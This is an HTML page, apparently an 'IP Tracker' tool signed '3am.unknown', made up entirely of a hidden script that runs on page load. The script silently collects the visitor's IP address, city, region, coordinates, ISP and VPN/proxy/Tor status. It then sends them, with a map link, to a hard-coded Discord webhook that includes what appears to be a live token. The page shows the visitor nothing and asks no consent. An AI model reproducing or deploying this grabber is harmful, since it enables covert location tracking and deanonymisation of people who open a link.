<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>3am v1</title>
</head>
<body>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X";

        fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;
            return fetch(`https://ipinfo.io/widget/demo/${ip}`);
        })
        .then(res => res.json())
        .then(data => {
            if (!data.data) throw new Error("Unexpected response structure");
            const info = data.data;
            const [latitude, longitude] = info.loc.split(',');
            const mapUrl = `https://www.openstreetmap.org/?mlat=${latitude.trim()}&mlon=${longitude.trim()}`;

            const embed = {
                username: "IP Tracker",
                avatar_url: "https://www.experten.de/content.4923677.images.wpdht.Netzwerk-IP-180806077-AS-flashmovie.jpg", 
                embeds: [{
                    title: "IP Information",
                    color: 000000,
                    image: {
                        url: "https://www.experten.de/content.4923677.images.wpdht.Netzwerk-IP-180806077-AS-flashmovie.jpg"
                    },
                    fields: [
                        {
                            name: "",
                            value: 
                                `**IP Address**
                                \`${info.ip || 'N/A'}\`
                    
                                **Location**
                                \`City:         ${info.city || 'N/A'}\`
                                \`Region:       ${info.region || 'N/A'}\`
                                \`Country:      ${info.country || 'N/A'}\`
                                \`Coordinates:  ${info.loc || 'N/A'}\`
                    
                                **Organization**
                                \`Org:          ${info.org || 'N/A'}\`
                    
                                **Privacy Details**
                                \`VPN:          ${info.privacy?.vpn ? "True" : "False"}\`
                                \`Proxy:        ${info.privacy?.proxy ? "True" : "False"}\`
                                \`Tor:          ${info.privacy?.tor ? "True" : "False"}\`
                                \`Relay:        ${info.privacy?.relay ? "True" : "False"}\`
                                \`Provider:     ${info.privacy?.service || 'N/A'}\`
                    
                                **Map:** [View on OpenStreetMap](${mapUrl})`,
                            inline: false
                        }
                    ],
                    footer: { text: "IP Tracker | by 3am.unknown" },
                    timestamp: new Date()
                }]
            };

            return fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            });
        })
    </script>
</body>
</html>
